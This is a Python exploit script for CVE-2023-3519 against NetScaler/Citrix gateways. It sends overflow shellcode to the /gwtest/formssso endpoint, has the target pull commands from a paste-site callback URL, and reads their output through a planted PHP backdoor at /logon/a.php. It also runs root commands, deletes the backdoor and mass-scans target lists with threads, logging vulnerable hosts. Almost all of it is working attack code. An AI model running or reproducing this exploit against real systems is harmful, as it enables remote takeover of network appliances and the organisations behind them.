import re
import ssl
import uuid
import socket 
import struct 
import urllib3
import requests
import argparse
import concurrent.futures

from rich.console import Console
from urllib.parse import urlparse
from mkshellcode import mkshellcode
from alive_progress import alive_bar

urllib3.disable_warnings()
console = Console()

def generate_callback_url(data):
    url = "https://fars.ee/"
    random_filename = str(uuid.uuid4())

    response = requests.post(url, files={"c": (random_filename, data)})
    match = re.search(fr"{url}(?P<uuid>[a-zA-Z0-9\-]+)", response.text)
    if not match:
        raise Exception("Failed to extract the UUID using regex.")
    uuid_value = match.group("uuid")       
   
    url = (url).replace("https://", "")
    callback_url = url + str(uuid_value)
    console.print(f"Created Callback URL: {callback_url}", style="bold green")
    console.print(f"UUID: {random_filename}", style="bold yellow") if data != "" else None
    
    return callback_url

    
class CVE_2023_3519_Exploit:
    RETURN_OFFSET = 0xa8
    JMP_STACK = 0x02778c04
    FIXUP = "0xc7f78d"
    RBP_FIXUP = "0x30"
    
    
    def __init__(self, target, callback, mode_file):
        self.host = self._parse_target(target)
        self.shellcode = self._generate_shellcode(callback)
        self.mode_file = mode_file
        self.callback_url = callback
        self.output = None
        
    def _parse_target(self, target):
        parsed = urlparse(target)
        if not parsed.scheme and ':' in target:
            host, port = target.split(':')
            return host, int(port)
        return parsed.hostname, parsed.port or 443

    def _generate_shellcode(self, callback):
        return mkshellcode(self.RBP_FIXUP, self.FIXUP, callback)

    def execute(self):
        assert len(self.shellcode)<=self.RETURN_OFFSET-32, "Payload is too long. Try a shorter URL"
        payload = self.pad(self.shellcode, self.RETURN_OFFSET, b'\xcc')
        payload += struct.pack("<Q", self.JMP_STACK)
        payload += b'\xe9' + struct.pack("<i", -(self.RETURN_OFFSET + 8 + 5))  # jmp to start of shellcode
        console.print("Sending payload...", style="bold yellow") if not self.mode_file else None
        self.make_request(self.host, payload)
        url = f"https://{self.host[0]}:{self.host[1]}"

        response = requests.get(f"{url}/logon/a.php", verify=False, timeout=40)
        if response.status_code == 200:
            match = re.search(r'\[S\](.*?)\[E\]', response.text, re.DOTALL)
            if match or True:
                extracted_content = match.group(1).strip()
                console.print(f"[bold red][+] {url} is vulnerable to CVE-2023-3519[/bold red]\n[bold green][-] Extracted Output:[/bold green] [bold yellow]{extracted_content}[/bold yellow]")
                
                if self.output:
                    with open(self.output, "a") as f:
                        f.write(url.strip() + "\n")
                    
        elif not self.mode_file:
            console.print("Failed to access PHP backdoor", style="bold red")
            console.print(response.status_code, style="bold red")
            console.print(response.text, style="bold red")


    @staticmethod
    def pad(dat, l, c):
        return dat + (c * (l - len(dat)))

    @staticmethod
    def make_request(host, payload):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        timeout = 40 

        try:
            s = socket.create_connection(host, timeout=timeout)
            ssock = ctx.wrap_socket(s)

            ssock.settimeout(timeout)
            
            data = CVE_2023_3519_Exploit.url_encode(payload)
            req = b"GET /gwtest/formssso?event=start&target=" + data + b" HTTP/1.0\r\n"
            req += "Host: {}:{}\r\n\r\n".format(host[0], host[1]).encode()
            ssock.sendall(req)
       
        except:
            ssock.close()
            s.close()


    @staticmethod
    def url_encode(data):
        out = b''
        for i in data:
            if i > 0x9f:
                out += bytes([i])
            else:
                out += '%{:02x}'.format(i).encode()
        return out

def process_url(target, callback, output_file, mode_file, bar):
    try:
        exploit = CVE_2023_3519_Exploit(target.strip(), callback, mode_file)
        exploit.output = output_file
        exploit.execute()
        
    except Exception as e:
        if not mode_file:  
            console.print(f"Error processing {target}: {str(e)}", style="bold red")
    bar()

def main():
    parser = argparse.ArgumentParser(description="CVE-2023-3519 Exploit Script")
    parser.add_argument('--target', help="Target in the format of an URL or ip:port")
    parser.add_argument('--file', help="File containing list of targets (one per line)")
    parser.add_argument('--output', required=False, default="vulnerable.txt", help="Output file for vulnerable targets")
    parser.add_argument('--threads', type=int, default=10, help="Number of threads to use")
    args = parser.parse_args()


    payload = """/var/python/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.execv("/usr/bin/id", ["/usr/bin/id"])'\nrm /var/netscaler/logon/a.php\nchmod 555 /bin/sh"""
    COMMANDS = f"echo [S]\n{payload}\necho [E]"
    
    if not args.target and not args.file:
        console.print("Please specify either --target or --file", style="bold red")
        exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.file:
        with open(args.file, "r") as f:
            targets.extend(f.readlines())

    try:
        callback_url = generate_callback_url(COMMANDS)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            with alive_bar(len(targets), title="Processing targets", bar="smooth") as bar:
                for _ in executor.map(process_url, 
                                    targets, 
                                    [callback_url for _ in targets], 
                                    [args.output for _ in targets], 
                                    [args.file is not None for _ in targets],
                                    [bar] * len(targets)):
                    pass

    except KeyboardInterrupt:
        console.print("\nOperation interrupted by the user.", style="bold yellow")
   
        
if __name__ == "__main__":
    main()

